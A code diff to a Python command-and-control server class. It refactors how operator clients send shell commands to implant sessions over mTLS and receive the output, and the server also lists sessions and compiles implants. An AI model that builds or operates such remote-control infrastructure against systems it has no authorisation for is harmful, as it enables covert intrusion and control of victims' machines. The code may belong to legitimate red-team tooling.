@@ -55,38 +55,19 @@ class C2Server(object):
 
         client.send(message.SerializeToString())
 
-    def _shell_session(self, session_id, client):
+    def _shell_session(self, command_str, session_id):
             conn, addr = self.implantlistener.sessions.get(session_id) 
-            
-            # send to client that new session is connected
+
+            output = mtls.session(conn, command_str)
+
+            response = operatorpb_pb2.SessionCmdOutput(cmdOutput=output, id=session_id)
+
             message = operatorpb_pb2.Message(
-                message_type=operatorpb_pb2.Message.MessageType.SessionConnected,
-                data = operatorpb_pb2.SessionConnected(addr=str(addr)).SerializeToString()
+                message_type=operatorpb_pb2.Message.MessageType.SessionCmdOutput,
+                data=response.SerializeToString()
             )
 
-            client.send(message.SerializeToString())
-
-            while True:
-                userin = client.recv(1024)
-
-                message = operatorpb_pb2.Message()
-                message.ParseFromString(userin)
-
-                if message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
-                    server_cmd = operatorpb_pb2.ServerCmd()
-                    server_cmd.ParseFromString(message.data)
-
-
-                    if server_cmd.cmd == b"exit":
-                       self._send_client((f"Exiting session {addr}\n").encode("ascii"),client)
-                       break 
-
-                    output = mtls.session(conn, server_cmd.cmd)
-
-                    if not output:
-                        break
-
-                    self._send_client(output.decode("ascii"),client)
+            return (message.SerializeToString())
 
     def _execute_command(self, command, client):
         #command is an array of strings
@@ -97,15 +78,6 @@ class C2Server(object):
         elif command[0] == "sessions":
             return str(self.implantlistener.sessions.list()).encode("ascii")
 
-        # Interact with a session
-        elif command[0] == "use":
-            if command[1] not in self.implantlistener.sessions.list():
-                return (b"Session doesn't exist")
-
-            if len(command) == 2:
-                self._shell_session(command[1], client) 
-            else:
-                return(b"Usage: use <session>")
 
         # Compile an implant
         elif command[0] == "generate":
@@ -125,7 +97,7 @@ class C2Server(object):
             self.handler.brodcastImplants(client)
 
             print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
-            t = threading.Thread(target = self._listen_client,args = (client,address)).start()
+            threading.Thread(target = self._listen_client,args = (client,address)).start()
             self.connections.append(address) 
 
     def _listen_client(self, client, address):
@@ -136,15 +108,30 @@ class C2Server(object):
             message = operatorpb_pb2.Message()
             message.ParseFromString(data)
 
-            if message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
+            if message.message_type==operatorpb_pb2.Message.MessageType.SessionCmd:
+                session_cmd = operatorpb_pb2.SessionCmd()
+                session_cmd.ParseFromString(message.data)
+
+                command_str = session_cmd.cmd
+                session_id = session_cmd.id
+
+                #TODO: proper error handling
+                if session_id not in self.implantlistener.sessions.list():
+                    self._send_client(b"Session doesn't exist", client)
+                else:
+                    out = self._shell_session(command_str, session_id)
+                    client.send(out)
+
+
+            elif message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
                 server_cmd = operatorpb_pb2.ServerCmd()
                 server_cmd.ParseFromString(message.data)
-                commandStr = server_cmd.cmd.lower()
+                command_str = server_cmd.cmd.lower()
 
-                logging.info("Command: " + commandStr)
+                logging.info("Command: " + command_str)
 
-                if (commandStr != "exit"):
-                    response = self._execute_command(commandStr.split(), client)
+                if (command_str != "exit"):
+                    response = self._execute_command(command_str.split(), client)
                     if response:
                         self._send_client(response, client)
                 else:
